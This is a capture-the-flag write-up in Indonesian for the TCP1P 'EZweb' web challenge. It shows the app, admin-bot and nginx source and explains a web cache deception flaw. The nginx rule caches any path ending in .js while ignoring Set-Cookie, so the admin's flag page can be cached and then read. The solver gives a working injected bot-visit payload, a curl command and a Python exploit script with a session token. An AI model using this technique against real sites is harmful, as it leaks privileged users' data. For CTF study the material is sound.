# TCP1P CTF - WEB - EZweb Writeup

Pada challenge kali ini terdapat challenge CTF classic dimana kita diberikan sebuah web app dimana kita bisa melakukan login dan signup, dan bot web yang mana kita bisa menyuruh admin/bot untuk memvisit suatu url.

## Source Code
### routes.js
```javascript
const express = require('express');
const router = express.Router();
const JWTHelper = require('../helpers/JWTHelper');
const { createUser, getUserByUsername } = require('../helpers/database');
const { authMiddleware } = require('../middleware/AuthMiddleware');

router.get('/', authMiddleware,  (req, res) => {
    if (!req.user) {
        return res.redirect('/login');
    }

    return res.render('index.tpl', { user: req.user });
});

router.get('/register', (req, res) => {
    res.sendFile('register.html', { root: 'static' });
});

router.post('/register', async (req, res) => {
    try {
        const { username, password } = req.body;

        getUserByUsername(username, (err, user) => {
            if (err) {
                return res.redirect('/register?error=Database error');
            }

            if (user) {
                return res.redirect('/register?error=Username already taken. Please choose a different one.');
            } 

            createUser(username, password, 'user', (err) => {
                if (err) {
                    console.error(err);
                    return res.redirect('/register?error=Error registering user');
                }
                res.redirect('/login');
            });
        });
    } catch (error) {
        console.error(error);
        res.redirect('/register?error=An unexpected error occurred.');
    }
});

router.get('/login', (req, res) => {
    res.sendFile('login.html', { root: 'static' });
});

router.post('/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        getUserByUsername(username, (err, user) => {
            if (err) {
                return res.redirect('/login?error=Database error');
            }

            if (!user || (password !== user.password)) {
                return res.redirect('/login?error=Invalid credentials');
            } else {
                const token = JWTHelper.sign({ id: user.id, username: user.username, role: user.role });
                res.cookie('session', token, { httpOnly: true });
                res.redirect('/');
            }
        });
    } catch (error) {
        console.error(error);
        res.redirect('/login?error=An unexpected error occurred.');
    }
});

router.get('/flag/*', authMiddleware, async (req, res) => {
    if (req.user.role === 'admin') {
        res.send(process.env.FLAG);
    } else {
        res.status(403).send('You are not authorized to view this page');
    }
});

router.get('/logout', (req, res) => {
    res.clearCookie('session');
    res.redirect('/login');
});

module.exports = router;

```

### App.js
```javascript
const express = require('express');
const app = express();
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const nunjucks = require('nunjucks');
const path = require('path');
const dotenv = require('dotenv');

dotenv.config();

app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', `default-src *; script-src 'self' code.jquery.com cdn.jsdelivr.net stackpath.bootstrapcdn.com;`);
    next();
});

app.use('/', express.static(path.join(__dirname, 'static')));

nunjucks.configure('views', {
    autoescape: true,
    express: app
});

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

const userRouter = require('./routes/routes');
app.use('/', userRouter);

app.all('*', (req, res) => {
	return res.send(`Request ${req.path} not found!`);
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
```

### bot,js
```javascript
const { chromium, firefox, webkit } = require('playwright');
const fs = require('fs');
const path = require('path');
const jwt = require('jsonwebtoken');

const APP_SECRET = process.env['APP_SECRET'];

function sign(data) {
    try{
        data = Object.assign(data);
        return (jwt.sign(data, APP_SECRET, {
            algorithm: 'HS256'
        }))
    } catch(err) {
        console.error(err)
        return null;
    }
}

const CONFIG = {
    APPNAME: process.env['APPNAME'] || "Admin",
    APPURL: process.env['APPURL'] || "http://172.17.0.1",
    APPURLREGEX: process.env['APPURLREGEX'] || "^.*$",
    APPLIMITTIME: Number(process.env['APPLIMITTIME'] || "60"),
    APPLIMIT: Number(process.env['APPLIMIT'] || "5"),
    APPEXTENSIONS: (() => {
        const extDir = path.join(__dirname, 'extensions');
        const dir = [];
        fs.readdirSync(extDir).forEach(file => {
            if (fs.lstatSync(path.join(extDir, file)).isDirectory()) {
                dir.push(path.join(extDir, file));
            }
        });
        return dir.join(',');
    })(),
    APPBROWSER: process.env['BROWSER'] || 'chromium'
};

console.table(CONFIG);

function sleep(s) {
    return new Promise((resolve) => setTimeout(resolve, s));
}

const browserArgs = {
    headless: (() => {
        const is_x11_exists = fs.existsSync('/tmp/.X11-unix');
        if (process.env['DISPLAY'] !== undefined && is_x11_exists) {
            return false;
        }
        return true;
    })(),
    args: [
        '--disable-dev-shm-usage',
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-gpu',
        '--no-gpu',
        '--disable-default-apps',
        '--disable-translate',
        '--disable-device-discovery-notifications',
        '--disable-software-rasterizer',
        '--disable-xss-auditor',
        ...(() => {
            if (CONFIG.APPEXTENSIONS === "") return [];
            return [
                `--disable-extensions-except=${CONFIG.APPEXTENSIONS}`,
                `--load-extension=${CONFIG.APPEXTENSIONS}`
            ];
        })(),
    ],
    ignoreHTTPSErrors: true
};

/** @type {import('playwright').Browser} */
let initBrowser = null;

async function getContext(){
    /** @type {import('playwright').BrowserContext} */
    let context = null;
    if (CONFIG.APPEXTENSIONS === "") {
        if (initBrowser === null) {
            initBrowser = await (CONFIG.APPBROWSER === 'firefox' ? firefox.launch(browserArgs) : chromium.launch(browserArgs));
        }
        context = await initBrowser.newContext();
    } else {
        context = await (CONFIG.APPBROWSER === 'firefox' ? firefox.launch({browserArgs}) : chromium.launch(browserArgs)).newContext();
    }
    return context
}

console.log("Bot started...");

module.exports = {
    name: CONFIG.APPNAME,
    urlRegex: CONFIG.APPURLREGEX,
    rateLimit: {
        windowS: CONFIG.APPLIMITTIME,
        max: CONFIG.APPLIMIT
    },
    bot: async (urlToVisit) => {
        const context = await getContext()
        try {
            const page = await context.newPage();
            await context.addCookies([{
                name: "session",
                httpOnly: true,
                value: sign({
                    id: 1,
                    username: "admin",
                    role: "admin"
                }),
                url: CONFIG.APPURL
            }]);

            console.log(`bot visiting ${urlToVisit}`);
            await page.goto(urlToVisit, {
                waitUntil: 'load',
                timeout: 10 * 1000
            });
            await sleep(15000);

            console.log("browser close...");
            return true;
        } catch (e) {
            console.error(e);
            return false;
        } finally {
            if (CONFIG.APPEXTENSIONS !== "") {
                await context.browser().close();
            } else {
                await context.close();
            }
        }
    }
};

```

### proxy/default.conf
```bash
proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=cache:1m max_size=10g inactive=60m use_temp_path=off;

server {
    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
        proxy_cache cache;
        proxy_cache_valid 200 302 60m;
        proxy_pass http://app:3000;
        proxy_ignore_headers Expires Cache-Control Set-Cookie;
    }

    location / {
        proxy_pass http://app:3000;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    location /report/ {
        proxy_pass http://bot:3000/;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

Setelah menelaah beberapa kode diatas, ditemukan adanya missconfigure pada default.conf, tepatnya di `proxy_ignore_headers Expires Cache-Control Set-Cookie;`, yang mana jika suatu user melakukan visit ke path yang mengandung `jpg, jpeg, png, gif, ico, css, dan js` maka page tersebut akan di cache tanpa mengecek header.

ini bisa kita manfaatkan dengan menyuruh admin/bot untuk melakukan visit ke flag lalu data flag akan tersimpan di path tersebut, dan kita tinggal melakukan visit path tersebut untuk mendapatkan flag.

## Sovler
### Bot visit payload
```
http://proxy/document/1;location.href=atob('L2ZsYWcvbjIuanM=')//..%2f..%2flogin.html
```
### Curl /flag/n2.js
```
curl https://ctf.tcp1p.team:2332/flag/n2.js
```

saya mendecode `/flag/n2.js` ke dalam base64. setelah bot succeed memvisit path tersebut kita tinggal melakukan visit path tersebut dan mendapatkan flag

## Automation Solver Code
```python
import requests
import base64

URL = 'http://ctf.tcp1p.team:10017'
flag = '/flag/n2.js'
payload = base64.b64encode(flag.encode())
print(payload)
url = {"url":"http://proxy/document/1;location.href=atob('{}')//..%2f..%2flogin.html".format(payload.decode())}
cookies = {'session': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDc0LCJ1c2VybmFtZSI6ImJ5ZjFzaCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzI4ODkzMzAxfQ.3oiuk8HPoJsSFSxTkpRaV-oarP1wZfYkij3HK_7UfbQ'}

print(url['url'])

response = requests.post(URL+'/report/', data=url)
print(response.text)
print('============= GET FLAG =============')
res = requests.get(URL+f'{flag}', cookies=cookies)
print(res.text)
```